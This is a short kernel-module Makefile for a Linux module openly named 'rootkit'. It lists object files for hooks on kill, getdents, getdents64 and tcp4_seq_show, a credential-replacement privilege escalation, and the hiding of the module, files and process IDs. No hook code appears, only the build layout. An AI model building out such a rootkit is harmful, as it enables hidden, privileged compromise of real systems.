obj-m := rootkit.o

rootkit-y := src/mod.o
# syscalls/hooks
rootkit-y += src/syscalls/syscalls.o src/syscalls/hooks/kill.o src/syscalls/hooks/getdents.o src/syscalls/hooks/getdents64.o src/syscalls/hooks/tcp4_seq_show.o
# supporting objects for hooks
rootkit-y += src/privesc/credreplace.o src/hide/lkm.o src/hide/dirent.o src/hide/pid.o

